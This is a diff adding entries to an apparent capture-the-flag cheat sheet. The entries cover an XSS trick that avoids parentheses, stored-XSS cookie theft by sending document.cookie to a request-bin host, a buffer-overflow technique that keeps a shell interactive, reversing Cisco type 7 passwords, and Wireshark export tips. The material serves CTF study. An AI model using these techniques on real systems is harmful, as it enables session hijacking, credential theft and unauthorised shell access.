@@ -20,12 +20,23 @@ When prompted for a password:
 
 - Try switching request to put or post
 
+##### If () are blocked:  
+```javascript
+ `${console.log`test`}`
+ //instead of
+ console.log("test")
+ ```
+
+### Different Angular XSS payloads
+    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md
+    
 ### StoredXSS
 
 To try to intercept requests from the page:
 
     https://requestbin.myworkato.com/
 
+    Can add link to img src, or change window.location to this and add "?flag=" + document.cookie
 ## Hashcat
 
 Password bruteforce cracking from a hash: Hashcat
@@ -108,6 +119,13 @@ bit 0 or 1 are the least noticeable
         AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00 <- [Buffer A] cat .passwd # <- [Buffer B]
 
     If need to inject null byte: printf '\x00' 
+
+If we have a shell that does not execute anything:
+
+`(printf 'bufferoverflow' && cat) | ./program`
+
+Adding cat at the end lets us interact with the shell.
+
 
 ## Unix bins that can bypass security stuff
 https://gtfobins.github.io/
@@ -292,3 +310,16 @@ To find a file in the image:
 
 To read the content of the file:
 `icat [img] [inode]`
+
+
+## Networking
+
+#### Wireshark
+    
+- Follow stream to read the data sent in one chunk
+- `File -> Export Objects -> [Protocol]` To get all the objects sent 
+
+#### Cisco IOS
+
+- username [username] password 7 [password] <--- hashed password is reversable
+  - https://packetlife.net/toolbox/type7/ 
